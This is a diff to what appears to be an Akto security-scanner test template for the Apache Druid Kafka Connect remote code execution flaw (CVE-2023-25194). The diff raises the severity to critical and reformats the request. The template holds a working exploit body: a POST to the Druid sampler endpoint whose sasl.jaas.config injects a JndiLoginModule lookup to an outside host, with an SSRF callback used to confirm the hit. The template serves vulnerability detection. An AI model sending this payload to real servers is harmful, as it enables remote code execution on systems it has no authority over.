@@ -2,20 +2,26 @@ id: APACHE_DRUID_KAFKA_RCE
 info:
   name: "Apache Druid Kafka Connect Remote Code Execution"
   description: "This vulnerability allows attackers to execute arbitrary code on a system by exploiting improperly secured Kafka indexing service configurations. This issue arises when malicious input is processed through Kafka Connect, enabling remote code execution (RCE) within the Apache Druid environment. Unpatched instances with misconfigurations are particularly vulnerable to this attack."
-  details:  "This vulnerability is caused by insecure configurations in the Kafka indexing service, allowing unauthenticated users to exploit the system by sending crafted payloads. If Kafka Connect processes these payloads without proper validation, it can lead to the execution of arbitrary code on the server. This vulnerability primarily affects Druid instances that are using Kafka for data ingestion and have not applied security patches or hardened their configurations."
+  details: "This vulnerability is caused by insecure configurations in the Kafka indexing service, allowing unauthenticated users to exploit the system by sending crafted payloads. If Kafka Connect processes these payloads without proper validation, it can lead to the execution of arbitrary code on the server. This vulnerability primarily affects Druid instances that are using Kafka for data ingestion and have not applied security patches or hardened their configurations."
   impact: "The impact of this vulnerability is severe, as it allows an attacker to execute arbitrary code on the affected server. This could result in full system compromise, enabling the attacker to manipulate data, escalate privileges, install malware, or disrupt services. Organizations using vulnerable Apache Druid configurations may face significant security risks, including data breaches and operational downtime."
   category:
     name: COMMAND_INJECTION
     shortName: Command Injection
     displayName: Command Injection
   subCategory: APACHE_DRUID_KAFKA_RCE
-  severity: MEDIUM
+  severity: CRITICAL
   references:
     - "https://twitter.com/trbughunters/status/1283133356922884096"
   cwe:
     - CWE-77
   cve:
     - CVE-2023-25194
+
+attributes:
+  nature: INTRUSIVE
+  plan: FREE
+  duration: FAST
+
 
 api_selection_filters:
   method:
@@ -32,14 +38,13 @@ execute:
   type: single
   requests:
     - req:
-      - modify_method: POST
-      - send_ssrf_req:
-          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-      - modify_url: "/druid/indexer/v1/sampler"
-      - add_query_param:
-          for: connect
-      - replace_body: '{"type":"kafka","spec":{"type":"kafka","ioConfig":{"type":"kafka","consumerProperties":{"bootstrap.servers":"127.0.0.1:6666","sasl.mechanism":"SCRAM-SHA-256","security.protocol":"SASL_SSL","sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"https://test-services.akto.io/${random_uuid}:6666/test\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"},"topic":"test","useEarliestOffset":true,"inputFormat":{"type":"regex","pattern":"([\\s\\S]*)","listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{},"granularitySpec":{"rollup":false}},"tuningConfig":{"type":"kafka"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}'
-      
+        - modify_method: POST
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+        - modify_url: "/druid/indexer/v1/sampler"
+        - add_query_param:
+            for: connect
+        - replace_body: '{"type":"kafka","spec":{"type":"kafka","ioConfig":{"type":"kafka","consumerProperties":{"bootstrap.servers":"127.0.0.1:6666","sasl.mechanism":"SCRAM-SHA-256","security.protocol":"SASL_SSL","sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"https://test-services.akto.io/${random_uuid}:6666/test\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"},"topic":"test","useEarliestOffset":true,"inputFormat":{"type":"regex","pattern":"([\\s\\S]*)","listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{},"granularitySpec":{"rollup":false}},"tuningConfig":{"type":"kafka"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}'
 validate:
   response_code:
     eq: 400
@@ -51,4 +56,4 @@ validate:
       - </html>
     length:
       gt: 0
-  ssrf_url_hit: ${random_uuid} 
+  ssrf_url_hit: ${random_uuid}
